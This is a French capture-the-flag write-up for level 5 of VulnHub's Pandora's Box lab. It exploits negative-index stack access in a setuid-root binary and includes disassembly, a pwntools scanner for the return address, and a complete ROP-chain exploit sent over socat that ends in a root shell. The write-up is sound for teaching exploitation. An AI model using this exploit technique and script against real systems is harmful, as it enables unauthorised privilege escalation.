# Solution du CTF Pandora's Box de VulnHub (level 5)

On touche finalement (presque) à la fin du [CTF Pandora's Box de VulnHub](https://vulnhub.com/entry/pandoras-box-1,111/). Ce level 5 a beau nous donner un accès root il est pourtant le plus simple des exploitations de binaires du CTF.

Le programme qui a donc le bit setuid root permet de stocker des valeurs numériques dans un tableau :

```shellsession
$ ./level5
#########################
# Simple Number Manager #
#########################
This tool allows you to store and view upto 10 numbers
in a array.
Type exit to close or help for a command list
> help
commands:
exit        : Close number manager
set         : Store a number
get         : View a number
> get
> id: 6
value: 0
> set
> id: 6
> value: 31337
Value stored
> get
> id: 6
value: 31337
> get
> id: 5000
The array only has 10 entry's, use id 0..9
> get
> id: -10
value: 0
> set
> id: -10
> value: 5
Value stored
> get
> id: -10
value: 5
```

## Pour l'exploitation, tapez -234

On voit rapidement que les valeurs négatives d'index sont acceptées aussi bien pour la méthode `get` que `set`.

On peut donc aller au délà du tableau dans la stack. Le code fait un simple test pour s'assurer que l'index est plus petit que 10 :

```nasm
0x0804867d      mov     dword [base], 0xa ; int base
0x08048685      mov     dword [endptr], 0 ; char **endptr
0x0804868d      mov     dword [esp], ebx ; const char *str
0x08048690      call    strtoul    ; sym.strtoul ; long strtoul(const char *str, char **endptr, int base)
0x08048695      cmp     eax, 9     ; 9
0x08048698      jle     0x8048748
; --- snip ---
0x08048748      and     eax, 0xff  ; 255
0x0804874d      mov     eax, dword [esp + eax*4 + 0x14]
0x08048751      mov     dword [endptr], str.value:__u ; 0x80ab8af ; const char *format
0x08048759      mov     dword [base], eax
0x0804875d      mov     eax, dword [stderr] ; obj._IO_stderr
                                   ; 0x80cac24
0x08048762      mov     dword [esp], eax ; FILE *stream
0x08048765      call    fprintf    ; sym.fprintf ; int fprintf(FILE *stream, const char *format, void *va_args)
```

J'ai écrit un code pour dialoguer avec le programme et demander un index de -1 jusqu'à -1000 jusqu'à ce que l'on croise l'adresse de retour :

```python
from pwn import *                                                                                                      
                                                                                                                       
p = process('./level5', stdin=process.PTY, stdout=process.PTY)                                                       

for i in range(-1, -1000, -1):
    p.readuntil(b"> ")
    p.sendline(b"get")
    p.readuntil(b"> id: ")
    p.sendline(str(i).encode())
    value = int(p.readline().split()[1])
    if value == 0x0804816e:
        print(f"Found return value at index {i}")
        break

p.readuntil(b"> ")
p.sendline(b"exit")
p.close()
```

Le script trouve ainsi notre adresse de retour à l'index `-234` du tableau.

Pour tester l'exploitation je vais simplement réécrire l'adresse de retour par une adresse (`0x080a7e22`) pointant sur une instruction `0xCC` (sigtrap) :

```shellsession
$ gdb -q ./level5
Reading symbols from ./level5...

This GDB supports auto-downloading debuginfo from the following URLs:
https://debuginfod.opensuse.org/ 
Enable debuginfod for this session? (y or [n]) n
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in ./level5)
(gdb) get
Undefined command: "get".  Try "help".
(gdb) r
Starting program: /tmp/ctf/level5 
#########################
# Simple Number Manager #
#########################
This tool allows you to store and view upto 10 numbers
in a array.
Type exit to close or help for a command list
> get
> id: -234
value: 134513006
> set
> id: -234
> value: 134905378
Value stored
> exit
Goodbye

Program received signal SIGTRAP, Trace/breakpoint trap.
0x080a7e23 in uw_init_context_1 ()
```

Ca fonctionne. Le binaire a le bit NX dont on va utiliser la technique du ROP. L'adresse de retour sera écrasée par la première adresse de la ROP-chain (générée via ROPgadget puis customisée). Les autres valeurs sont passées à la suite sur les adresses dans le sens croissant.

## Hammer time

Comme j'ai fait mon code avec `pwntools` et que je ne peux pas l'exécuter directement avec ses dépendances sur la VM du CTF je reprend la méthode des précédents levels pour que le programme vulnérable écoute sur un port :

```bash
socat TCP4-listen:6666,reuseaddr,fork EXEC:./level5
```

Voci mon code d'exploitation :

```python
import struct
from pwn import *                                                                                                      

values = [
    0x0805383d,  # pop ecx ; pop ebx ; ret
    0,
    0,
    0x080a8406,  # pop eax ; ret
    70,          # setreuid syscall
    0x08053f90,  # int 80; ret
    0x08053816,  # pop edx ; ret
    0x080ca7e0,  # @ .data
    0x080a8406,  # pop eax ; ret
    struct.unpack("<I", b"/bin")[0],
    0x080795a1,  # mov dword ptr [edx], eax ; ret
    0x08053816,  # pop edx ; ret
    0x080ca7e4,  # @ .data + 4
    0x080a8406,  # pop eax ; ret
    struct.unpack("<I", b"//sh")[0],
    0x080795a1,  # mov dword ptr [edx], eax ; ret
    0x08053816,  # pop edx ; ret
    0x080ca7e8,  # @ .data + 8
    0x08097caf,  # xor eax, eax ; ret
    0x080795a1,  # mov dword ptr [edx], eax ; ret
    0x08048492,  # pop ebx ; ret
    0x080ca7e0,  # @ .data
    0x0805383d,  # pop ecx ; pop ebx ; ret
    0x080ca7e8,  # @ .data + 8
    0x080ca7e0,  # padding without overwrite ebx
    0x08053816,  # pop edx ; ret
    0x080ca7e8,  # @ .data + 8
    0x080a8406,  # pop eax ; ret
    11,
    0x08048d2d,  # int 0x80
]

# switch lines for local exploitation
# p = process('./level5', stdin=process.PTY, stdout=process.PTY)                                                       
p = remote("192.168.56.83", 6666)

saved_eip_offset = 0
for i in range(-1, -1000, -1):
    p.readuntil(b"> ")
    p.sendline(b"get")
    p.readuntil(b"> id: ")
    p.sendline(str(i).encode())
    value = int(p.readline().split()[1])
    if value == 0x0804816e:
        print(f"Found return value at index {i}")
        saved_eip_offset = i
        break

for i, value in enumerate(values):
    p.readuntil(b"> ")
    p.sendline(b"set")
    p.readuntil(b"> id: ")
    p.sendline(str(saved_eip_offset + i).encode())
    p.readuntil(b"> value: ")
    p.sendline(str(value).encode())

p.readuntil(b"> ")
p.sendline(b"exit")
p.interactive()
p.close()

```

Pwn3d !

```shellsession
$ python exploit_lvl5.py 
[+] Opening connection to 192.168.56.83 on port 6666: Done
Found return value at index -234
[*] Switching to interactive mode
Goodbye
$ id
uid=0(root) gid=1004(level4) groups=0(root),1004(level4)
$ cd /root
$ ls -al
total 32
drwx------  3 root root 4096 Jan  4  2015 .
drwxr-xr-x 22 root root 4096 Jan  3  2015 ..
-rw-------  1 root root  275 Jan  4  2015 .bash_history
-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
drwx------  2 root root 4096 Jan  4  2015 .cache
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
-rw-------  1 root root 1491 Jan  4  2015 .viminfo
-rw-r--r--  1 root root 1314 Jan  4  2015 fl4gz0r.tXt
```

Le flag est en fait un dernier exercice à voir plus tard ;-)

*Publié le 27 décembre 2022*
